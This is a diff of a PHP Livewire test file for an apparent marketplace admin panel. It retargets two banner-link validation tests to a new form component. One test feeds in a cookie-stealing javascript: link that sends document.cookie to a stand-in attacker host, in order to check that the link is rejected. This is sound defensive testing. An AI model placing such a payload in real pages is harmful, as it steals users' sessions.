@@ -1,7 +1,7 @@
 <?php
 
 use App\Enums\ProductStatus;
-use App\Livewire\Admin\Content\Banners;
+use App\Livewire\Admin\Content\Banners\Form as BannersForm;
 use App\Livewire\Admin\Support\Tickets;
 use App\Livewire\Seller\Products\BulkImport;
 use App\Livewire\Storefront\Auth\ResetPassword;
@@ -36,8 +36,7 @@ function mediumsAdmin(array $permissions): User
 test('a banner link cannot carry a javascript scheme', function () {
     $admin = mediumsAdmin(['cms.manage']);
 
-    Livewire::actingAs($admin)->test(Banners::class)
-        ->call('create')
+    Livewire::actingAs($admin)->test(BannersForm::class)
         ->set('title.en', 'Hero')
         ->set('destination', 'custom')
         ->set('linkUrl', 'javascript:fetch("//evil.example.com?c="+document.cookie)')
@@ -59,8 +58,7 @@ test('ordinary banner links still save', function () {
     $admin = mediumsAdmin(['cms.manage']);
 
     foreach (['/c/groceries-pantry', 'https://halalbizs.test/promo'] as $url) {
-        Livewire::actingAs($admin)->test(Banners::class)
-            ->call('create')
+        Livewire::actingAs($admin)->test(BannersForm::class)
             ->set('title.en', 'Hero')
             ->set('destination', 'custom')
             ->set('linkUrl', $url)
